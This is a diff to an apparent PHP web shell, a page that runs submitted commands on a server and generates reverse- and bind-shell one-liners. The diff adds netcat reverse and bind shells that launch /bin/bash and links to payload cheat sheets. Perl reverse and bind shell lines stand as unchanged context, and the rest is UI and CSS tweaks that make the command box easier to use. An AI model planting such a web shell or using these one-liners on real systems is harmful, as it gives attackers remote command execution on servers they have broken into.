@@ -2001,8 +2001,10 @@ echo '</div>';
     <div class="langs">
         <div class="lang lang-py" onclick="show_shell_cmd('python','lang-py')">Python</div>
         <div class="lang lang-bash" onclick="show_shell_cmd('bash','lang-bash')">Bash</div>
-        <div class="lang lang-nc">Netcat</div>
+        <div class="lang lang-nc" onclick="show_shell_cmd('netcat','lang-nc')">Netcat</div>
         <div class="lang lang-pl" onclick="show_shell_cmd('perl','lang-pl')">Perl</div>
+        <br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">More Bind Shells</a><br>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">More Reverse Shells</a>
     </div>
 </div>
 
@@ -2095,7 +2097,7 @@ echo '<form action="' . $script_name . '" method="get">';
 echo '<p class="section-header">Command:</p>';
 echo '<div class="terminal">';
 echo '<p class="shell-path">Working Dir: ' . $_SESSION['shell_path'] . '</p>';
-echo '<input class="cmd-input" id="cmd" type="text" name="cmd"><br>';
+echo '<textarea class="cmd-input" id="cmd" type="text" name="cmd"></textarea><br>';
 echo '<input class="p-setting" type="hidden" name="p" value="' . htmlspecialchars($path) . '">';
 echo '<input class="ip-setting" type="hidden" name="ip" value="' . htmlspecialchars($ip_setting) . '">';
 echo '<input class="port-setting" type="hidden" name="port" value="' . htmlspecialchars($port_setting) . '">';
@@ -2148,6 +2150,16 @@ echo '</div>';
 var input = document.getElementById("cmd");
 input.focus();
 input.select();
+
+function submitOnEnter(event){
+    if(event.which === 13){
+        event.target.form.dispatchEvent(new Event("submit", {cancelable: true}));
+        event.preventDefault(); // Prevents the addition of a new line in the text field (not needed in a lot of cases)
+    }
+}
+
+document.getElementsByClassName("cmd-input")[0].addEventListener("keypress", submitOnEnter);
+
 function hide_shell_cmds(){
     var tabcontent;
     tabcontent = document.getElementsByClassName("shell-option-pop-up");
@@ -2204,6 +2216,9 @@ function show_shell_cmd(lang_type,class_name){
     shells["perl"]["reverse"] = "perl -e 'use Socket;$i=\"<span class='ip-placeholder'></span>\";$p=<span class='port-placeholder'></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');};'"
     shells["perl"]["bind"] = "perl -e \"use Socket;$p=<span class='port-placeholder'></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));bind(S,sockaddr_in($p, <span class='ip-placeholder'></span>));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');exec('/bin/bash -i');};\""
  
+    shells["netcat"]["reverse"] = "nc <span class='ip-placeholder'></span> <span class='port-placeholder'></span> -e /bin/bash";
+    shells["netcat"]["bind"] = "nc -nlvp <span class='port-placeholder'></span> -e /bin/bash";
+
     obj = document.getElementsByClassName("shell-option-pop-up");
     obj[0].style.display = "block";
     obj = document.getElementsByClassName("shell-text-reverse");
@@ -2245,10 +2260,10 @@ hide_shell_cmds()
     padding: 5px;
 }
 .vertical-menu {
-  width: 110px;
+  width: 130px;
   padding: 5px;
   float: left;
-  height: 100%;
+  height: 400px;
 }
 div.shell-menu input {
     width: 100px;
@@ -2312,13 +2327,16 @@ div.shell-menu div.config {
     font-size: medium;
     padding: 6px;
     min-width: 95%;
+    word-wrap: break-word;
+    word-break: break-all;
+    height: 80px;
 }
 
 .floater{
     float: left;
     padding: 10px;
     margin: auto;
-    width: 45%;
+    width: 38%;
 }
 .reset{
     padding-right: 3px;
